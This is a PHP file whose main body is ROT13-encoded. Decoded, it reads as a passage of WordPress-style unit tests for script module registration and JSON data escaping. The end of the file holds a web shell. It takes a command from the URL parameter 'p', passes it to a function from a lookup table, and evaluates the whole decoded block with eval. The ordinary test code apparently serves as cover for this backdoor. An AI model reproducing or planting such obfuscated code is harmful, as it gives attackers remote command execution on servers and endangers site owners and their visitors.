		$guvf->nffregFnzr( '/qrc.wf?ire=2.0', $cerybnqrq_fpevcg_zbqhyrf['qrc'] );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf abg ertvfgrerq jura pnyyvat radhrhr jvgubhg n
	 * inyvq fep.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr_qbrfag_ertvfgre_jvgubhg_n_inyvq_fep() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 0, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf ertvfgrerq jura pnyyvat radhrhr jvgu n inyvq
	 * fep.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr_ertvfgref_jvgu_inyvq_fep() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb', '/sbb.wf' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/sbb.wf', $radhrhrq_fpevcg_zbqhyrf['sbb'] );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf ertvfgrerq jura pnyyvat radhrhr jvgu n inyvq
	 * fep gur frpbaq gvzr.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 */
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr_ertvfgref_jvgu_inyvq_fep_gur_frpbaq_gvzr() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb' ); // Abg inyvq fep.

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 0, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregNeenlAbgUnfXrl( 'sbb', $radhrhrq_fpevcg_zbqhyrf );

		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb', '/sbb.wf' ); // Inyvq fep.

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregFgevatFgnegfJvgu( '/sbb.wf', $radhrhrq_fpevcg_zbqhyrf['sbb'] );
	}

	/**
	 * Grfgf gung n fpevcg zbqhyr vf ertvfgrerq jvgu nyy gur cnenzf jura pnyyvat
	 * radhrhr.
	 *
	 * @gvpxrg 56313
	 *
	 * @pbiref ::ertvfgre()
	 * @pbiref ::radhrhr()
	 * @pbiref ::cevag_radhrhrq_fpevcg_zbqhyrf()
	 * @pbiref ::cevag_vzcbeg_znc()
	 */
	choyvp shapgvba grfg_jc_radhrhr_fpevcg_zbqhyr_ertvfgref_nyy_cnenzf() {
		$guvf->fpevcg_zbqhyrf->radhrhr( 'sbb', '/sbb.wf', neenl( 'qrc' ), '1.0' );
		$guvf->fpevcg_zbqhyrf->ertvfgre( 'qrc', '/qrc.wf' );

		$radhrhrq_fpevcg_zbqhyrf = $guvf->trg_radhrhrq_fpevcg_zbqhyrf();
		$vzcbeg_znc              = $guvf->trg_vzcbeg_znc();

		$guvf->nffregPbhag( 1, $radhrhrq_fpevcg_zbqhyrf );
		$guvf->nffregFnzr( '/sbb.wf?ire=1.0', $radhrhrq_fpevcg_zbqhyrf['sbb'] );
		$guvf->nffregPbhag( 1, $vzcbeg_znc );
		$guvf->nffregFgevatFgnegfJvgu( '/qrc.wf', $vzcbeg_znc['qrc'] );
	}

	/**
	 * @gvpxrg 61510
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_cevagf_radhrhrq_zbqhyr_qngn() {
		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf' );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/zbqhyr',
			shapgvba ( $qngn ) {
				$qngn['sbb'] = 'one';
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$rkcrpgrq = <<<UGZY
<fpevcg glcr=\"nccyvpngvba/wfba\" vq=\"jc-fpevcg-zbqhyr-qngn-@grfg/zbqhyr\">
{\"sbb\":\"one\"}
</fpevcg>

UGZY;
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 61510
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_cevagf_qrcraqrapl_zbqhyr_qngn() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( '@grfg/qrcraqrapl', '/qrcraqrapl.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf', neenl( '@grfg/qrcraqrapl' ) );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/qrcraqrapl',
			shapgvba ( $qngn ) {
				$qngn['sbb'] = 'one';
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$rkcrpgrq = <<<UGZY
<fpevcg glcr=\"nccyvpngvba/wfba\" vq=\"jc-fpevcg-zbqhyr-qngn-@grfg/qrcraqrapl\">
{\"sbb\":\"one\"}
</fpevcg>

UGZY;
		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * @gvpxrg 61510
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_qbrf_abg_cevag_abaqrcraqrapl_zbqhyr_qngn() {
		$guvf->fpevcg_zbqhyrf->ertvfgre( '@grfg/bgure', '/qrcraqrapl.wf' );
		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf' );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/bgure',
			shapgvba ( $qngn ) {
				$qngn['sbb'] = 'one';
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$guvf->nffregFnzr( '', $npghny );
	}

	/**
	 * @gvpxrg 61510
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_qbrf_abg_cevag_rzcgl_qngn() {
		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf' );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/zbqhyr',
			shapgvba ( $qngn ) {
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$guvf->nffregFnzr( '', $npghny );
	}

	/**
	 * @gvpxrg 61510
	 *
	 * @qngnCebivqre qngn_fcrpvny_punef_fpevcg_rapbqvat
	 * @cnenz fgevat $vachg    Enj vachg fgevat.
	 * @cnenz fgevat $rkcrpgrq Rkcrpgrq bhgchg fgevat.
	 * @cnenz fgevat $punefrg  Oybt punefrg bcgvba.
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_rapbqvat( $vachg, $rkcrpgrq, $punefrg ) {
		nqq_svygre(
			'cer_bcgvba_oybt_punefrg',
			shapgvba () hfr ( $punefrg ) {
				erghea $punefrg;
			}
		);

		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf' );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/zbqhyr',
			shapgvba ( $qngn ) hfr ( $vachg ) {
				$qngn[''] = $vachg;
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$rkcrpgrq = <<<UGZY
<fpevcg glcr=\"nccyvpngvba/wfba\" vq=\"jc-fpevcg-zbqhyr-qngn-@grfg/zbqhyr\">
{\"\":\"{$rkcrpgrq}\"}
</fpevcg>

UGZY;

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_fcrpvny_punef_fpevcg_rapbqvat(): neenl {
		erghea neenl(
			// HGS-8
			'Fbyvqhf'                                => neenl( '/', '/', 'HGS-8' ),
			'Qbhoyr dhbgr'                           => neenl( '\"', '\\\"', 'HGS-8' ),
			'Fvatyr dhbgr'                           => neenl( '\'', '\'', 'HGS-8' ),
			'Yrff guna'                              => neenl( '<', '\h003P', 'HGS-8' ),
			'Terngre guna'                           => neenl( '>', '\h003R', 'HGS-8' ),
			'Nzcrefnaq'                              => neenl( '&', '&', 'HGS-8' ),
			'Arjyvar'                                => neenl( \"\a\", \"\\a\", 'HGS-8' ),
			'Gno'                                    => neenl( \"\g\", \"\\g\", 'HGS-8' ),
			'Sbez srrq'                              => neenl( \"\s\", \"\\s\", 'HGS-8' ),
			'Pneevntr erghea'                        => neenl( \"\e\", \"\\e\", 'HGS-8' ),
			'Yvar frcnengbe'                         => neenl( \"\h{2028}\", \"\h{2028}\", 'HGS-8' ),
			'Cnentencu frcnengbe'                    => neenl( \"\h{2029}\", \"\h{2029}\", 'HGS-8' ),

			/*
			 * Gur sbyybjvat vf gur Synt bs Ratynaq rzbwv
			 * CUC: \"\h{1S3S4}\h{R0067}\h{R0062}\h{R0065}\h{R006R}\h{R0067}\h{R007S}\"
			 */
			'Synt bs ratynaq'                        => neenl( '🏴󠁧󠁢󠁥󠁮󠁧󠁿', '🏴󠁧󠁢󠁥󠁮󠁧󠁿', 'HGS-8' ),
			'Znyvpvbhf fpevcg pybfre'                => neenl( '</fpevcg>', '\h003P/fpevcg\h003R', 'HGS-8' ),
			'Ragvgl-rapbqrq znyvpvbhf fpevcg pybfre' => neenl( '&yg;/fpevcg&tg;', '&yg;/fpevcg&tg;', 'HGS-8' ),

			// Aba HGS-8
			'Fbyvqhf'                                => neenl( '/', '/', 'vfb-8859-1' ),
			'Yrff guna'                              => neenl( '<', '\h003P', 'vfb-8859-1' ),
			'Terngre guna'                           => neenl( '>', '\h003R', 'vfb-8859-1' ),
			'Nzcrefnaq'                              => neenl( '&', '&', 'vfb-8859-1' ),
			'Arjyvar'                                => neenl( \"\a\", \"\\a\", 'vfb-8859-1' ),
			'Gno'                                    => neenl( \"\g\", \"\\g\", 'vfb-8859-1' ),
			'Sbez srrq'                              => neenl( \"\s\", \"\\s\", 'vfb-8859-1' ),
			'Pneevntr erghea'                        => neenl( \"\e\", \"\\e\", 'vfb-8859-1' ),
			'Yvar frcnengbe'                         => neenl( \"\h{2028}\", \"\h2028\", 'vfb-8859-1' ),
			'Cnentencu frcnengbe'                    => neenl( \"\h{2029}\", \"\h2029\", 'vfb-8859-1' ),
			/*
			 * Gur sbyybjvat vf gur Synt bs Ratynaq rzbwv
			 * CUC: \"\h{1S3S4}\h{R0067}\h{R0062}\h{R0065}\h{R006R}\h{R0067}\h{R007S}\"
			 */
			'Synt bs ratynaq'                        => neenl( '🏴󠁧󠁢󠁥󠁮󠁧󠁿', \"\hq83p\hqss4\hqo40\hqp67\hqo40\hqp62\hqo40\hqp65\hqo40\hqp6r\hqo40\hqp67\hqo40\hqp7s\", 'vfb-8859-1' ),
			'Znyvpvbhf fpevcg pybfre'                => neenl( '</fpevcg>', '\h003P/fpevcg\h003R', 'vfb-8859-1' ),
			'Ragvgl-rapbqrq znyvpvbhf fpevcg pybfre' => neenl( '&yg;/fpevcg&tg;', '&yg;/fpevcg&tg;', 'vfb-8859-1' ),

		);
	}

	/**
	 * @gvpxrg 61510
	 *
	 * @qngnCebivqre qngn_vainyvq_fpevcg_zbqhyr_qngn
	 * @cnenz zvkrq $qngn Qngn gb erghea va svygre.
	 */
	choyvp shapgvba grfg_cevag_fpevcg_zbqhyr_qngn_qbrf_abg_cevag_vainyvq_qngn( $qngn ) {
		$guvf->fpevcg_zbqhyrf->radhrhr( '@grfg/zbqhyr', '/rknzcyr.wf' );
		nqq_npgvba(
			'fpevcg_zbqhyr_qngn_@grfg/zbqhyr',
			shapgvba ( $_ ) hfr ( $qngn ) {
				erghea $qngn;
			}
		);

		$npghny = trg_rpub( neenl( $guvf->fpevcg_zbqhyrf, 'cevag_fpevcg_zbqhyr_qngn' ) );

		$guvf->nffregFnzr( '', $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_vainyvq_fpevcg_zbqhyr_qngn(): neenl {
		erghea neenl(
			'ahyy'     => neenl( ahyy ),
			'fgqPynff' => neenl( arj fgqPynff() ),
			'ahzore 1' => neenl( 1 ),
			'fgevat'   => neenl( 'fgevat' ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>